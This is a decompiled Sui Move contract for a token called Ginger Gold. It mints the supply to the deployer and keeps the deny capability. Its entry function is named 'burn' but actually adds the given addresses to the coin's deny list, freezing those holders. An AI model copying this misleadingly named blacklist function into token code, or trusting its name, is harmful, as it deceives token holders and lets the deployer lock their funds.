module 0xf2d26066c63aa590731d51d62438d0138c59ed1fcad783ecf5d49331b9684bc6::ggold {
    struct GGOLD has drop {
        dummy_field: bool,
    }

    entry fun burn(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCap<GGOLD>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        while (v0 < 0x1::vector::length<address>(&arg2)) {
            let v1 = 0x1::vector::pop_back<address>(&mut arg2);
            if (!0x2::coin::deny_list_contains<GGOLD>(arg0, v1)) {
                0x2::coin::deny_list_add<GGOLD>(arg0, arg1, v1, arg3);
            };
            v0 = v0 + 1;
        };
    }

    fun init(arg0: GGOLD, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency<GGOLD>(arg0, 6, b"GGOLD", b"Ginger Gold", b"Ginger Gold", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://i.pinimg.com/736x/48/64/20/486420f8cbba9ee760de26f50a1ea7b2.jpg"))), arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<GGOLD>(&mut v3, 10000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<GGOLD>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<GGOLD>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCap<GGOLD>>(v1, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

